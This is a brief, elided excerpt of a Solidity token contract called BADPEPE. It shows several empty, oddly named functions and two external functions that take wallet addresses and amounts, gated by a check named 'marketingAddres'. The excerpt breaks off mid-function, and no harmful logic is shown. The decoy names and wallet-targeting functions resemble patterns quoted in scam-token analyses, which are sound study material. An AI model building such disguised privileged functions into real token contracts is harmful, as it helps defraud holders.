...
contract BADPEPE is Ownable {
    ...
    function magnitudeat() external {
    }
    function magnitudefor() external {
    }
    function preachas() public {
    }
    function preachre() public {
    }
    function understand(address[] calldata walletAddress) external {
    ...
    function slogan(uint256 amount, address walletAddr) external {
        if (marketingAddres()) {
